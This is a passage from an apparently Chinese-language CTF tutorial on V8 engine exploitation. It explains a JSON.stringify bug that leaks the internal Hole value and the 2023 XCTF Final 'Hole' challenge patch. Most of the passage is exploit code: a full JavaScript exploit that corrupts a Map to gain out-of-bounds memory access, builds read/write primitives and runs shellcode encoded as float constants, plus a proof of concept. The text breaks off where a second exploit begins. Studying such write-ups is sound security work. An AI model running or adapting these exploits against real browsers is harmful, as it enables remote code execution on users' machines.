<p>而前面的 <code>SerializeArrayLikeSlow</code> 会根据 <code>overflowed_</code> 标记判断发生溢出并返回异常。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">V8_INLINE <span class="type">bool</span> <span class="title">HasOverflowed</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> overflowed_; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (builder_.<span class="built_in">HasOverflowed</span>()) <span class="keyword">return</span> EXCEPTION;</span><br></pre></td></tr></table></figure></div>

<p>然而根据前面的分析我们发现，只要结果不是 <code>SUCCESS</code> 基本都是直接返回的，没有设置 <code>pending_exception</code> 这一操作。</p>
<p>比如像 <code>SerializeArrayLikeSlow</code> 在出现异常时都会调用 <code>ThrowInternal</code> 设置 <code>pending_exception</code> ，如果没有设置 <code>pending_exception</code> 在用户的 JS 代码中会将 <code>pending_exception</code> 的默认值 <code>Hole</code> catch 出来，这就是漏洞的成因。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">Isolate::ThrowInternal</span><span class="params">(Object raw_exception, MessageLocation* location)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Set the exception being thrown.</span></span><br><span class="line">  <span class="built_in">set_pending_exception</span>(*exception);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(<span class="built_in">heap</span>()).<span class="built_in">exception</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object <span class="title">Throw</span><span class="params">(Object exception)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">ThrowInternal</span>(exception, <span class="literal">nullptr</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeArrayLikeSlow</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSReceiver&gt; object, <span class="type">uint32_t</span> start, <span class="type">uint32_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We need to write out at least two characters per array element.</span></span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxSerializableArrayLength = String::kMaxLength / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (length &gt; kMaxSerializableArrayLength) &#123;</span><br><span class="line">    isolate_-&gt;<span class="built_in">Throw</span>(*isolate_-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewInvalidStringLengthError</span>());</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体利用手法在 Hole 已经介绍过了，exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [], b = [];</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">0x800000</span>);</span><br><span class="line">    a[<span class="number">20000</span>] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) a[i] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) b[i] = a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (hole) &#123;</span><br><span class="line">        <span class="keyword">return</span> hole;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;could not trigger&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题：2023XCTF-Final-Hole"><a href="#例题：2023XCTF-Final-Hole" class="headerlink" title="例题：2023XCTF Final Hole"></a>例题：2023XCTF Final Hole</h2><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/xctf2023_hole" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 247b33e9218a9345f0073f45b967530b38153272 </span><br><span class="line">gclient sync</span><br><span class="line">git apply diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>观察 <code>patch</code> 文件，首先发现对 <code>JSMap</code> 的 <code>Hole</code> 检查被 patch 掉了，因此可以考虑将 <code>Hole</code> 泄露出来然后借助 <code>JSMap</code> 进行 <code>Hole</code> 利用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc</span><br><span class="line">index f<span class="number">6238e3072</span>.<span class="number">.17821</span>d3124 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-collections-gen.cc</span><br><span class="line">+++ b/src/builtins/builtins-collections-gen.cc</span><br><span class="line">@@ <span class="number">-1765</span>,<span class="number">7</span> <span class="number">+1765</span>,<span class="number">7</span> @@ <span class="built_in">TF_BUILTIN</span>(MapPrototypeDelete, CollectionsBuiltinsAssembler) &#123;</span><br><span class="line">                          <span class="string">&quot;Map.prototype.delete&quot;</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// This check breaks a known exploitation technique. See crbug.com/1263462</span></span><br><span class="line">-  <span class="built_in">CSA_CHECK</span>(<span class="keyword">this</span>, <span class="built_in">TaggedNotEqual</span>(key, <span class="built_in">TheHoleConstant</span>()));</span><br><span class="line">+  <span class="comment">// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"> </span><br><span class="line">   <span class="type">const</span> TNode&lt;OrderedHashMap&gt; table =</span><br><span class="line">       <span class="built_in">LoadObjectField</span>&lt;OrderedHashMap&gt;(<span class="built_in">CAST</span>(receiver), JSMap::kTableOffset);</span><br></pre></td></tr></table></figure></div>
<p>然后就是 <code>original_map.UnusedPropertyFields()</code> 的判断处加了一个 <code>times</code> 条件 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/js-native-context-specialization.cc b/src/compiler/js-native-context-specialization.cc</span><br><span class="line">index <span class="number">39302152</span>ed.<span class="number">.3193065</span>d7d <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/js-native-context-specialization.cc</span><br><span class="line">+++ b/src/compiler/js-native-context-specialization.cc</span><br><span class="line">@@ <span class="number">-29</span>,<span class="number">13</span> <span class="number">+29</span>,<span class="number">12</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/feedback-vector.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/heap-number.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/objects/string.h&quot;</span></span></span><br><span class="line">-</span><br><span class="line">+<span class="type">int</span> times=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line"> <span class="keyword">namespace</span> compiler &#123;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> &#123;</span><br><span class="line">-</span><br><span class="line"> <span class="function"><span class="type">bool</span> <span class="title">HasNumberMaps</span><span class="params">(JSHeapBroker* broker, ZoneVector&lt;MapRef&gt; <span class="type">const</span>&amp; maps)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (MapRef map : maps) &#123;</span><br><span class="line">     <span class="keyword">if</span> (map.<span class="built_in">IsHeapNumberMap</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">@@ <span class="number">-2812</span>,<span class="number">7</span> <span class="number">+2811</span>,<span class="number">7</span> @@ JSNativeContextSpecialization::<span class="built_in">BuildPropertyStore</span>(</span><br><span class="line">       <span class="comment">// with this transitioning store.</span></span><br><span class="line">       MapRef transition_map_ref = transition_map.<span class="built_in">value</span>();</span><br><span class="line">       MapRef original_map = transition_map_ref.<span class="built_in">GetBackPointer</span>().<span class="built_in">AsMap</span>();</span><br><span class="line">-      <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">+      <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span> &amp;&amp; times--==<span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">DCHECK</span>(!field_index.<span class="built_in">is_inobject</span>());</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// Reallocate the properties &#123;storage&#125;.</span></span><br></pre></td></tr></table></figure></div>
<p>通过调试观察 <code>JSObject</code> 的 <code>Map</code> 发现 <code>unused property fields</code> 是用于记录存储 <code>properties</code> 的 <code>PropertyArray</code> 还有多少空闲位置。</p>
<p>结合对代码上下文的分析，发现这里的逻辑是在为 <code>JSObject</code> 添加新的属性时如果 <code>unused property fields</code> 为 0 则申请一个新的 <code>PropertyArray</code> 来存储 <code>properties</code> 。这里修改判断 <code>unused property fields</code> 为 0 的条件可能会造成 <code>PropertyArray</code> 越界。</p>
<p>要注意的是这个代码是在 JIT 的时候执行的。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we need to perform a transitioning store.</span></span><br><span class="line">base::Optional&lt;MapRef&gt; transition_map = access_info.<span class="built_in">transition_map</span>();</span><br><span class="line"><span class="keyword">if</span> (transition_map.<span class="built_in">has_value</span>()) &#123;</span><br><span class="line">  <span class="comment">// Check if we need to grow the properties backing store</span></span><br><span class="line">  <span class="comment">// with this transitioning store.</span></span><br><span class="line">  MapRef transition_map_ref = transition_map.<span class="built_in">value</span>();</span><br><span class="line">  MapRef original_map = transition_map_ref.<span class="built_in">GetBackPointer</span>().<span class="built_in">AsMap</span>();</span><br><span class="line">  <span class="keyword">if</span> (original_map.<span class="built_in">UnusedPropertyFields</span>() == <span class="number">0</span> &amp;&amp; times--==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">DCHECK</span>(!field_index.<span class="built_in">is_inobject</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reallocate the properties &#123;storage&#125;.</span></span><br><span class="line">    storage = effect = <span class="built_in">BuildExtendPropertiesBackingStore</span>(</span><br><span class="line">        original_map, storage, effect, control);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform the actual store.</span></span><br><span class="line">    effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(field_access),</span><br><span class="line">                              storage, value, effect, control);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Atomically switch to the new properties below.</span></span><br><span class="line">    field_access = AccessBuilder::<span class="built_in">ForJSObjectPropertiesOrHashKnownPointer</span>();</span><br><span class="line">    value = storage;</span><br><span class="line">    storage = receiver;</span><br><span class="line">  &#125;</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">common</span>()-&gt;<span class="built_in">BeginRegion</span>(RegionObservability::kObservable), effect);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(AccessBuilder::<span class="built_in">ForMap</span>()), receiver,</span><br><span class="line">      <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">Constant</span>(transition_map_ref), effect, control);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">StoreField</span>(field_access), storage,</span><br><span class="line">                            value, effect, control);</span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">FinishRegion</span>(),</span><br><span class="line">                            <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>(), effect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此有如下 POC ：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    obj.<span class="property">b1</span> = <span class="number">1</span>;</span><br><span class="line">    obj.<span class="property">b2</span> = <span class="number">2</span>;</span><br><span class="line">    obj.<span class="property">b3</span> = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_hole</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123; <span class="attr">sky</span>: <span class="number">123</span> &#125;;</span><br><span class="line">        obj.<span class="property">a2</span> = <span class="number">1</span>;</span><br><span class="line">        obj.<span class="property">a3</span> = <span class="number">2</span>;</span><br><span class="line">        obj.<span class="property">a4</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="title function_">trigger</span>(obj); </span><br><span class="line">        hole_array = [, <span class="literal">undefined</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// % DebugPrint(obj);</span></span><br><span class="line">    <span class="comment">// % SystemBreak();</span></span><br><span class="line">    <span class="keyword">return</span> obj.<span class="property">b3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调试发现，由于 <code>trigger</code> 函数优化后在对 <code>unused property fields</code> 的检查上存在漏洞，导致 <code>PropertyArray</code> 越界可以越界读到 <code>hole_array</code> 上将 <code>Hole</code> 泄露出来。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/b2df67a234f2cd34bb32397526594f01.png"
                      alt="在这里插入图片描述"
                ><br>这里要注意的是 <code>hole_array</code> 必须不声明直接赋值，否则不会和 <code>PropertyArray</code> 重叠。</p>
<p><code>Hole</code> 泄露出来后的利用就很常规了。exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 